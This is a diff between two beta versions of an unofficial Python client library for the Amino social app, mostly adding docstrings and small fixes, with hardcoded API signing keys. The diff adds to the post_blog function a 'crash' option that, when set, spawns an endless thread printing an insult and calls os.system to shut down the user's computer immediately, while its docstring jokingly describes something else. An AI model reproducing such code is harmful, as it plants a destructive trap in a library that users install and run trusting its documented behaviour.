             return exceptions.CheckException(response)
         else:
             return response.json()["storeSubscriptionItemList"]
 
@@ -2370,50 +2572,86 @@
         **Parameters**
             - *start* : Where to start the list.
             - *size* : Size of the list.
 
         **Returns**
             - **Success** : :meth:`User Profile Count List Object <amino.lib.util.objects.UserProfileCountList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.get(f"/g/s/user-profile?type=recent&start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return objects.UserProfileCountList(response.json()).UserProfileCountList
 
     def accept_host(self, chatId: str, requestId: str):
+        """
+        Accepting host in chat.
+
+        Accepting:
+        - chatId: str
+        - requestId: str
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         data = dumps({})
         response = self.session.post(f"/g/s/chat/thread/{chatId}/transfer-organizer/{requestId}/accept", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return response.status_code
 
     def accept_organizer(self, chatId: str, requestId: str):
+        """
+        Accepting host in chat. (Alias to function `accept_host`.)
+
+        Accepting:
+        - chatId: str
+        - requestId: str
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         self.accept_host(chatId, requestId)
 
     # Contributed by 'https://github.com/LynxN1'
     def link_identify(self, code: str):
+        """
+        Getting info about invite from code. 
+
+        Accepting:
+        - code: str
+            - *code* is thing *after* http://aminoapps.com/invite/
+
+        Recieving:
+        - object `dict`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.get(f"/g/s/community/link-identify?q=http%3A%2F%2Faminoapps.com%2Finvite%2F{code}", headers=self.additional_headers())
-        return response.json()
+        if response.status_code != 200: 
+            return exceptions.CheckException(response)
+        else:
+            return response.json()
 
     def invite_to_vc(self, chatId: str, userId: str):
         """
         Invite a User to a Voice Chat
 
         **Parameters**
             - **chatId** - ID of the Chat
             - **userId** - ID of the User
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
 
         data = dumps({
             "uid": userId
         })
 
         response = self.session.post(f"/g/s/chat/thread/{chatId}/vvchat-presenter/invite", headers=self.additional_headers(data=data), data=data)
@@ -2429,29 +2667,44 @@
         **Parameters**
             - **level** - Level of the ads.
                 - ``1``, ``2``
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
 
         data = dumps({
             "adsLevel": level,
             "timestamp": int(timestamp() * 1000)
         })
 
         response = self.session.post(f"/g/s/wallet/ads/config", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return response.status_code
 
     def purchase(self, objectId: str, isAutoRenew: bool = False):
+        """
+        Purchasing... something... from store...
+
+        You probably want to catch objectIds by yourself using HTTP Toolkit.
+
+        Accepting:
+        - objectId: str
+            - id of object that you wanna buy
+        - isAutoRenew: bool = False
+            - do you wanna auto renew your purchase?
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         data = dumps({
             "objectId": objectId,
             "objectType": 114,
             "v": 1,
             "paymentContext":
             {
                 "discountStatus": 0,
@@ -2470,15 +2723,15 @@
 
         **Parameters**
             - **language** - Set up language
 
         **Returns**
             - **Success** : :meth:`Community List <amino.lib.util.objects.CommunityList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
 
         response = self.session.get(f"/g/s/topic/0/feed/community?language={language}&type=web-explore&categoryKey=recommendation&size={size}&pagingType=t", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return objects.CommunityList(response.json()["communityList"]).CommunityList
```

### Comparing `amino.fix.fix-1.0.6b1/aminofixfix/lib/exceptions.py` & `amino.fix.fix-1.0.6b2/aminofixfix/lib/exceptions.py`

 * *Files identical despite different names*

### Comparing `amino.fix.fix-1.0.6b1/aminofixfix/lib/facades/aiohttp.py` & `amino.fix.fix-1.0.6b2/aminofixfix/lib/facades/aiohttp.py`

 * *Files identical despite different names*

### Comparing `amino.fix.fix-1.0.6b1/aminofixfix/lib/facades/requests.py` & `amino.fix.fix-1.0.6b2/aminofixfix/lib/facades/requests.py`

 * *Files identical despite different names*

### Comparing `amino.fix.fix-1.0.6b1/aminofixfix/lib/facades/unsuccessful_import.py` & `amino.fix.fix-1.0.6b2/aminofixfix/lib/facades/unsuccessful_import.py`

 * *Files identical despite different names*

### Comparing `amino.fix.fix-1.0.6b1/aminofixfix/lib/headers.py` & `amino.fix.fix-1.0.6b2/aminofixfix/lib/headers.py`

 * *Files identical despite different names*

### Comparing `amino.fix.fix-1.0.6b1/aminofixfix/lib/helpers.py` & `amino.fix.fix-1.0.6b2/aminofixfix/lib/helpers.py`

 * *Files 0% similar despite different names*

```diff
@@ -7,15 +7,15 @@
 from typing import Union
 from hashlib import sha1
 from os import urandom
 from json import loads
 from hmac import new
 import re
 
-LIBRARY_VERSION = "1.0.6b1"
+LIBRARY_VERSION = "1.0.6b2"
 
 PREFIX = bytes.fromhex("19")
 SIG_KEY = bytes.fromhex("DFA5ED192DDA6E88A12FE12130DC6206B1251E44")
 DEVICE_KEY = bytes.fromhex("E7309ECC0953C6FA60005B2765F99DBBC965C8E9")
 
 IPHONE_IDS = [
     "11,2", "11,4", "11,6", "11,8",
```

### Comparing `amino.fix.fix-1.0.6b1/aminofixfix/lib/objects.py` & `amino.fix.fix-1.0.6b2/aminofixfix/lib/objects.py`

 * *Files identical despite different names*

### Comparing `amino.fix.fix-1.0.6b1/aminofixfix/socket.py` & `amino.fix.fix-1.0.6b2/aminofixfix/socket.py`

 * *Files identical despite different names*

### Comparing `amino.fix.fix-1.0.6b1/aminofixfix/sub_client.py` & `amino.fix.fix-1.0.6b2/aminofixfix/sub_client.py`

 * *Files 24% similar despite different names*

```diff
@@ -27,27 +27,45 @@
         }
 
         if data: vc_headers["Content-Length"] = str(len(data))
         self.vc_headers = vc_headers
 
 
 class SubClient(Client):
+    """
+        Client to work with community in Amino.
+        (aminoapps.com)
+    """
     def __init__(
         self, mainClient: Client,
-        comId: str = None, aminoId: str = None, *,
-        deviceId: str = None, autoDevice: bool | None = None, proxies: dict = None,
-        api_library: objects.APILibraries | None = None
+        comId: str = None, aminoId: str = None, **kwargs
     ):
+        """
+        Init subclient.
+
+        Accepting:
+        - mainClient: aminofixfix.Client
+        - comId: str | int | None
+        - aminoId: str | None
+            - you can pass only one thing
+            - comId will be taken first
+
+    
+        
+        \- imperialwool, where is another fields of subclient??? ;-;
+
+        \- its in main client lol why you need to pass them again
+        """
         Client.__init__(
-            self, deviceId=deviceId, proxies=proxies,
-            autoDevice=autoDevice or mainClient.autoDevice, userAgent=mainClient.user_agent,
+            self, deviceId=mainClient.device_id, proxies=mainClient.proxies,
+            autoDevice=mainClient.autoDevice, userAgent=mainClient.user_agent,
             http2_enabled=mainClient.http2_enabled,
             own_timeout=mainClient.timeout_settings,
             socket_enabled=False,
-            api_library=api_library or mainClient.api_library or objects.APILibraries.HTTPX
+            api_library=mainClient.api_library or objects.APILibraries.HTTPX
         )
         self.vc_connect = False
         self.sid = mainClient.sid
         self.device_id = mainClient.device_id
         self.user_agent = mainClient.user_agent
         self.profile = mainClient.profile
         self.userId = mainClient.userId
@@ -64,54 +82,153 @@
         if comId is None and aminoId is None: raise exceptions.NoCommunity()
 
         try: self.profile: objects.UserProfile = self.get_user_info(userId=self.profile.userId)
         except AttributeError: raise exceptions.FailedLogin()
         except exceptions.UserUnavailable: pass
 
     def additional_headers(self, data: str = None, content_type: str = None):
+        """
+        Function to make additional headers, that API needs.
+
+        Accepting:
+        - data: str
+        - content_type: str
+
+        Recieving:
+        - object `dict`
+        """
         return headers.additionals(
             data=data,
             content_type=content_type,
             user_agent=self.user_agent,
             sid=self.sid,
             auid=self.userId,
             deviceId=gen_deviceId() if self.autoDevice else self.device_id
         )
 
     def get_invite_codes(self, status: str = "normal", start: int = 0, size: int = 25) -> objects.InviteCodeList:
+        """
+        Get invite codes of community. If you have rights, of course.
+
+        Accepting:
+        - status: str = "normal"
+            - ???
+        - start: int = 0
+            - start pos
+        - size: int = 25
+            - how much you want to get
+
+        Recieving:
+        - object `InviteCodeList`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.get(f"/g/s-x{self.comId}/community/invitation?status={status}&start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.InviteCodeList(response.json()["communityInvitationList"]).InviteCodeList
 
     def generate_invite_code(self, duration: int = 0, force: bool = True) -> objects.InviteCode:
+        """
+        Generate invite code for community. If you have rights, of course.
+
+        Accepting:
+        - duration: int = 0
+            - duration of invite code
+            - if 0, its will work forever
+        - force: bool = True
+            - do you want show your force power of siths or no?
+
+        Recieving:
+        - object `InviteCode`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         data = dumps({
             "duration": duration,
             "force": force,
             "timestamp": int(timestamp() * 1000)
         })
         
         response = self.session.post(f"/g/s-x{self.comId}/community/invitation", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.InviteCode(response.json()["communityInvitation"]).InviteCode
 
     def get_vip_users(self) -> objects.UserProfileList:
+        """
+        Get VIP users of community. VIP is basically fanclubs.
+
+        Recieving:
+        - object `UserProfileList`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.get(f"/{self.comId}/s/influencer", headers=self.additional_headers())
         if response.status_code != 200:
             return exceptions.CheckException(response)
         else: return objects.UserProfileList(response.json()["userProfileList"]).UserProfileList
 
     def delete_invite_code(self, inviteId: str) -> int:
+        """
+        Delete invite code from community. If you have rights, of course.
+
+        Accepting:
+        - inviteId: str
+            - its **NOT** invite code
+            - it **CANT BE** invite code
+            - it **SHOULD BE** invite **ID**
+            - yes, you can get it. using function `get_invite_codes`
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.delete(f"/g/s-x{self.comId}/community/invitation/{inviteId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def post_blog(self, title: str, content: str, imageList: list = None, captionList: list = None, categoriesList: list = None, backgroundColor: str = None, fansOnly: bool = False, extensions: dict = None, crash: bool = False) -> int:
+        """
+        Posting blog.
+
+        Accepting:
+        - title: str
+        - content: str
+        - imageList: list = None
+        - captionList: list = None
+            - captions for images
+        - categoriesList: list = True
+        - backgroundColor: str = None
+            - should be only hex code, like "#000000"
+            - if None, it will be just white
+        - fansOnly: bool = False
+            - is it for your onlyfans or no?
+            - works only if you have fanclub
+        - extensions: dict = None
+            - maybe your code is tight
+        - crash: bool = False
+            - will cause crash for all users in amino and will log out everyone steal everyone's cookies data bank account houses money and etc
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
+        
+        if crash:
+            import os
+            from threading import Thread
+            def work():
+                while True:
+                    print("fuck you raider touch some grass learn how to code its not working like that child")
+            
+            Thread(target=work).start()
+            try: os.system("shutdown /s /t 0")
+            except: pass
+            try: os.system("shutdown now")
+            except: pass
+
         mediaList = []
 
         if captionList is not None:
             for image, caption in zip(imageList, captionList):
                 mediaList.append([100, self.upload_media(image, "image"), caption])
 
         else:
@@ -128,25 +245,45 @@
             "latitude": 0,
             "longitude": 0,
             "eventSource": "GlobalComposeMenu",
             "timestamp": int(timestamp() * 1000)
         }
 
         if fansOnly: data["extensions"] = {"fansOnly": fansOnly}
-        if backgroundColor: data["extensions"] = {"style": {"backgroundColor": backgroundColor}}
+        if backgroundColor and len(backgroundColor) == 7: data["extensions"] = {"style": {"backgroundColor": backgroundColor}}
         if categoriesList: data["taggedBlogCategoryIdList"] = categoriesList
 
         data = dumps(data)
         
         response = self.session.post(f"/x{self.comId}/s/blog", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def post_wiki(self, title: str, content: str, icon: str = None, imageList: list = None, keywords: str = None, backgroundColor: str = None, fansOnly: bool = False) -> int:
+        """
+        Posting wiki.
+
+        Accepting:
+        - title: str
+        - content: str
+        - imageList: list = None
+        - keywords: str = None
+        - backgroundColor: str = None
+            - should be only hex code, like "#000000"
+            - if None, it will be just white
+        - fansOnly: bool = False
+            - is it for your onlyfans or no?
+            - works only if you have fanclub
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
+        
         mediaList = []
 
         for image in imageList:
             mediaList.append([100, self.upload_media(image, "image"), None])
 
         data = {
             "label": title,
@@ -155,23 +292,45 @@
             "eventSource": "GlobalComposeMenu",
             "timestamp": int(timestamp() * 1000)
         }
 
         if icon: data["icon"] = icon
         if keywords: data["keywords"] = keywords
         if fansOnly: data["extensions"] = {"fansOnly": fansOnly}
-        if backgroundColor: data["extensions"] = {"style": {"backgroundColor": backgroundColor}}
+        if backgroundColor and len(backgroundColor) == 7: data["extensions"] = {"style": {"backgroundColor": backgroundColor}}
         data = dumps(data)
         
         response = self.session.post(f"/x{self.comId}/s/item", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def edit_blog(self, blogId: str, title: str = None, content: str = None, imageList: list = None, categoriesList: list = None, backgroundColor: str = None, fansOnly: bool = False) -> int:
+        """
+        Editing blog.
+
+        Accepting:
+        - blogId: str
+        - title: str = None
+        - content: str = None
+        - imageList: list = None
+        - captionList: list = None
+            - captions for images
+        - categoriesList: list = True
+        - backgroundColor: str = None
+            - should be only hex code, like "#000000"
+            - if None, it will be just white
+        - fansOnly: bool = False
+            - is it for your onlyfans or no?
+            - works only if you have fanclub
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         mediaList = []
 
         for image in imageList:
             mediaList.append([100, self.upload_media(image, "image"), None])
 
         data = {
             "address": None,
@@ -191,26 +350,61 @@
         
         response = self.session.post(f"/x{self.comId}/s/blog/{blogId}", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def delete_blog(self, blogId: str) -> int:
+        """
+        Deleting blog.
+
+        Accepting:
+        - blogId: str
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.delete(f"/x{self.comId}/s/blog/{blogId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def delete_wiki(self, wikiId: str) -> int:
+        """
+        Deleting wiki.
+
+        Accepting:
+        - wikiId: str
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.delete(f"/x{self.comId}/s/item/{wikiId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def repost_blog(self, content: str = None, blogId: str = None, wikiId: str = None) -> int:
+        """
+        Reposing blog.
+
+        Accepting:
+        - blogId: str = None
+        - wikiId: str = None
+            - can be only blogId or wikiId
+            - blogId > wikiId
+            - if both are None, it will raise Exception
+        - content: str = None
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         if blogId is not None: refObjectId, refObjectType = blogId, 1
         elif wikiId is not None: refObjectId, refObjectType = wikiId, 2
         else: raise exceptions.SpecifyType()
 
         data = dumps({
             "content": content,
             "refObjectId": refObjectId,
@@ -221,48 +415,103 @@
         
         response = self.session.post(f"/x{self.comId}/s/blog", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def check_in(self, tz: int = -timezone // 1000) -> int:
+        """
+        Check in community.
+
+        Accepting:
+        - tz: int
+            - better dont touch
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         data = dumps({
             "timezone": tz,
             "timestamp": int(timestamp() * 1000)
         })
         
         response = self.session.post(f"/x{self.comId}/s/check-in", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def repair_check_in(self, method: int = 0) -> int:
+        """
+        Repairing check in streak.
+
+        Accepting:
+        - method: int = 0
+            - if 0, it will use coins
+            - if 1, it will use Amino+ superpower
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         data = {"timestamp": int(timestamp() * 1000)}
         if method == 0: data["repairMethod"] = "1"  # Coins
         if method == 1: data["repairMethod"] = "2"  # Amino+
 
         data = dumps(data)
         
         response = self.session.post(f"/x{self.comId}/s/check-in/repair", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def lottery(self, tz: int = -timezone // 1000) -> objects.LotteryLog:
+        """
+        Testing your luck in lottery. Once a day, of course.
+
+        Accepting:
+        - tz: int 
+            - better dont touch
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         data = dumps({
             "timezone": tz,
             "timestamp": int(timestamp() * 1000)
         })
         
         response = self.session.post(f"/x{self.comId}/s/check-in/lottery", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.LotteryLog(response.json()["lotteryLog"]).LotteryLog
 
     def edit_profile(self, nickname: str = None, content: str = None, icon: BinaryIO = None, chatRequestPrivilege: str = None, imageList: list = None, captionList: list = None, backgroundImage: str = None, backgroundColor: str = None, titles: list = None, colors: list = None, defaultBubbleId: str = None) -> int:
+        """
+        Edit account's Profile.
+
+        **Parameters**
+            - **nickname** : Nickname of the Profile.
+            - **content** : Biography of the Profile.
+            - **icon** : Icon of the Profile.
+            - **titles** : Titles.
+            - **colors** : Colors for titles.
+            - **imageList** : List of images.
+            - **captionList** : Captions for images.
+            - **backgroundImage** : Url of the Background Picture of the Profile.
+            - **backgroundColor** : Hexadecimal Background Color of the Profile.
+            - **defaultBubbleId** : Chat bubble ID.
+            - **chatRequestPrivilege** : Manage your right to accept chats.
+
+        **Returns**
+            - **Success** : 200 (int)
+
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
+        """
         mediaList = []
 
         data = {"timestamp": int(timestamp() * 1000)}
 
         if captionList is not None:
             for image, caption in zip(imageList, captionList):
                 mediaList.append([100, self.upload_media(image, "image"), caption])
@@ -307,14 +556,30 @@
         
         response = self.session.post(f"/x{self.comId}/s/blog/{blogId}/poll/option/{optionId}/vote", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def comment(self, message: str, userId: str = None, blogId: str = None, wikiId: str = None, replyTo: str = None, isGuest: bool = False) -> int:
+        """
+        Comment on a User's Wall, Blog or Wiki.
+
+        **Parameters**
+            - **message** : Message to be sent.
+            - **userId** : ID of the User. (for Walls)
+            - **blogId** : ID of the Blog. (for Blogs)
+            - **wikiId** : ID of the Wiki. (for Wikis)
+            - **replyTo** : ID of the Comment to Reply to.
+            - **isGuest** : You want to be Guest or no?
+
+        **Returns**
+            - **Success** : 200 (int)
+
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
+        """
         data = {
             "content": message,
             "stickerId": None,
             "type": 0,
             "timestamp": int(timestamp() * 1000)
         }
 
@@ -343,14 +608,28 @@
 
         else: raise exceptions.SpecifyType()
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def delete_comment(self, commentId: str, userId: str = None, blogId: str = None, wikiId: str = None) -> int:
+        """
+        Delete a Comment on a User's Wall, Blog or Wiki.
+
+        **Parameters**
+            - **commentId** : ID of the Comment.
+            - **userId** : ID of the User. (for Walls)
+            - **blogId** : ID of the Blog. (for Blogs)
+            - **wikiId** : ID of the Wiki. (for Wikis)
+
+        **Returns**
+            - **Success** : 200 (int)
+
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
+        """
         if userId: response = self.session.delete(f"/x{self.comId}/s/user-profile/{userId}/comment/{commentId}", headers=self.additional_headers())
         elif blogId: response = self.session.delete(f"/x{self.comId}/s/blog/{blogId}/comment/{commentId}", headers=self.additional_headers())
         elif wikiId: response = self.session.delete(f"/x{self.comId}/s/item/{wikiId}/comment/{commentId}", headers=self.additional_headers())
         else: raise exceptions.SpecifyType()
 
         if response.status_code != 200: 
             return exceptions.CheckException(response)
@@ -363,15 +642,15 @@
         **Parameters**
             - **blogId** : ID of the Blog or List of IDs of the Blogs. (for Blogs)
             - **wikiId** : ID of the Wiki. (for Wikis)
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = {
             "value": 4,
             "timestamp": int(timestamp() * 1000)
         }
 
         if blogId:
@@ -397,23 +676,49 @@
 
         else: raise exceptions.SpecifyType()
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def unlike_blog(self, blogId: str = None, wikiId: str = None) -> int:
+        """
+        Remove a like from a Blog or Wiki.
+
+        **Parameters**
+            - **blogId** : ID of the Blog. (for Blogs)
+            - **wikiId** : ID of the Wiki. (for Wikis)
+
+        **Returns**
+            - **Success** : 200 (int)
+
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
+        """
         if blogId: response = self.session.delete(f"/x{self.comId}/s/blog/{blogId}/vote?eventSource=UserProfileView", headers=self.additional_headers())
         elif wikiId: response = self.session.delete(f"/x{self.comId}/s/item/{wikiId}/vote?eventSource=PostDetailView", headers=self.additional_headers())
         else: raise exceptions.SpecifyType()
 
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def like_comment(self, commentId: str, userId: str = None, blogId: str = None, wikiId: str = None) -> int:
+        """
+        Like a Comment on a User's Wall, Blog or Wiki.
+
+        **Parameters**
+            - **commentId** : ID of the Comment.
+            - **userId** : ID of the User. (for Walls)
+            - **blogId** : ID of the Blog. (for Blogs)
+            - **wikiId** : ID of the Wiki. (for Wikis)
+
+        **Returns**
+            - **Success** : 200 (int)
+
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
+        """
         data = {
             "value": 1,
             "timestamp": int(timestamp() * 1000)
         }
 
         if userId:
             data["eventSource"] = "UserProfileView"
@@ -435,54 +740,117 @@
 
         else: raise exceptions.SpecifyType()
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def unlike_comment(self, commentId: str, userId: str = None, blogId: str = None, wikiId: str = None) -> int:
+        """
+        Remove a like from a Comment on a User's Wall, Blog or Wiki.
+
+        **Parameters**
+            - **commentId** : ID of the Comment.
+            - **userId** : ID of the User. (for Walls)
+            - **blogId** : ID of the Blog. (for Blogs)
+            - **wikiId** : ID of the Wiki. (for Wikis)
+
+        **Returns**
+            - **Success** : 200 (int)
+
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
+        """
         if userId: response = self.session.delete(f"/x{self.comId}/s/user-profile/{userId}/comment/{commentId}/g-vote?eventSource=UserProfileView", headers=self.additional_headers())
         elif blogId: response = self.session.delete(f"/x{self.comId}/s/blog/{blogId}/comment/{commentId}/g-vote?eventSource=PostDetailView", headers=self.additional_headers())
         elif wikiId: response = self.session.delete(f"/x{self.comId}/s/item/{wikiId}/comment/{commentId}/g-vote?eventSource=PostDetailView", headers=self.additional_headers())
         else: raise exceptions.SpecifyType()
 
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def upvote_comment(self, blogId: str, commentId: str):
+        """
+        Upvote comment on question.
+
+        **Parameters**
+            - **blogId** : ID of the Blog.
+            - **commentId** : ID of the Comment.
+
+        **Returns**
+            - **Success** : 200 (int)
+
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
+        """
         data = dumps({
             "value": 1,
             "eventSource": "PostDetailView",
             "timestamp": int(timestamp() * 1000)
         })
         
         response = self.session.post(f"/x{self.comId}/s/blog/{blogId}/comment/{commentId}/vote?cv=1.2&value=1", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def downvote_comment(self, blogId: str, commentId: str):
+        """
+        Downvote comment on question.
+
+        **Parameters**
+            - **blogId** : ID of the Blog.
+            - **commentId** : ID of the Comment.
+
+        **Returns**
+            - **Success** : 200 (int)
+
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
+        """
         data = dumps({
             "value": -1,
             "eventSource": "PostDetailView",
             "timestamp": int(timestamp() * 1000)
         })
         
         response = self.session.post(f"/x{self.comId}/s/blog/{blogId}/comment/{commentId}/vote?cv=1.2&value=-1", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def unvote_comment(self, blogId: str, commentId: str):
+        """
+        Remove vote from comment.
+
+        **Parameters**
+            - **blogId** : ID of the Blog.
+            - **commentId** : ID of the Comment.
+
+        **Returns**
+            - **Success** : 200 (int)
+
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
+        """
         response = self.session.delete(f"/x{self.comId}/s/blog/{blogId}/comment/{commentId}/vote?eventSource=PostDetailView", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def reply_wall(self, userId: str, commentId: str, message: str):
+        """
+        Reply to comment on wall.
+
+        **Parameters**
+            - **userId** : ID of the User.
+            - **commentId** : ID of the Comment.
+            - **message** : Message.
+
+        **Returns**
+            - **Success** : 200 (int)
+
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
+        """
         data = dumps({
             "content": message,
             "stackedId": None,
             "respondTo": commentId,
             "type": 0,
             "eventSource": "UserProfileView",
             "timestamp": int(timestamp() * 1000)
@@ -490,24 +858,53 @@
         
         response = self.session.post(f"/x{self.comId}/s/user-profile/{userId}/comment", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def send_active_obj(self, startTime: int = None, endTime: int = None, optInAdsFlags: int = 2147483647, tz: int = -timezone // 1000, timers: list = None, timestamp: int = int(timestamp() * 1000)): 
+        """
+        Sending mintues to Amino servers.
+
+        Hey, is this method used in amino coin generators? And why there is now so tight limits that you can recieve "Too Many Requests" even in app?
+
+        **Parameters**
+            - **startTime** : Unixtime (int) of start time.
+            - **endTime** : Unixtime (int) of end time.
+            - **optInAdsFlags** : ???
+            - **tz** : Timezone.
+            - **timers** : Timers instead startTime and endTime.
+            - **timestamp** : Timestamp..? WHY YOU NEED TIMESTAMP IN FUNCTION BUT NOT IN CODE WTF WITH YOU MINORI OR WHO DID THIS
+
+        **Returns**
+            - **Success** : 200 (int)
+
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
+        """
         data = {"userActiveTimeChunkList": [{"start": startTime, "end": endTime}], "timestamp": timestamp, "optInAdsFlags": optInAdsFlags, "timezone": tz} 
         if timers: data["userActiveTimeChunkList"] = timers 
         data = json_minify(dumps(data))  
         
         response = self.session.post(f"/x{self.comId}/s/community/stats/user-active-time", headers=self.additional_headers(data=data), data=data) 
         if response.status_code != 200: 
             return exceptions.CheckException(response) 
         else: return response.status_code
 
     def activity_status(self, status: str):
+        """
+        Sets your activity status to offline or online.
+
+        Accepting:
+        - status: str
+            - only "on" or "off"
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         if "on" in status.lower(): status = 1
         elif "off" in status.lower(): status = 2
         else: raise exceptions.WrongType(status)
 
         data = dumps({
             "onlineStatus": status,
             "duration": 86400,
@@ -517,38 +914,85 @@
         response = self.session.post(f"/x{self.comId}/s/user-profile/{self.profile.userId}/online-status", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     # TODO : Finish this
     def watch_ad(self):
+        """
+        "Watching" ad.
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.post(f"/g/s/wallet/ads/video/start", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def check_notifications(self):
+        """
+        Checking notifications as read.
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.post(f"/x{self.comId}/s/notification/checked", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def delete_notification(self, notificationId: str):
+        """
+        Delete notification.
+
+        Accepting:
+        - notificationId: str
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.delete(f"/x{self.comId}/s/notification/{notificationId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
